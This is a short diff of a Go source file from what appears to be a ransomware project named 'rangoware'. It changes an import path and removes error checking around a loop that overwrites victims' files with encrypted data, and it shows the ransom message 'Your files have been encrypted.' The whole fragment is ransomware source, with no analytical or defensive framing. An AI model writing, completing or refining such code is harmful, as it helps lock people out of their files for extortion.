@@ -9,7 +9,7 @@ import (
 	"io/ioutil"
 	"os"
 
-	"../explorer"
+	"github.com/LuanSilveiraSouza/rangoware/explorer"
 )
 
 func main() {
@@ -35,11 +35,7 @@ func main() {
 			continue
 		}
 
-		err = ioutil.WriteFile(v, encrypted, 0644)
-
-		if err != nil {
-			continue
-		}
+		ioutil.WriteFile(v, encrypted, 0644)
 	}
 
 	msg := "Your files have been encrypted."
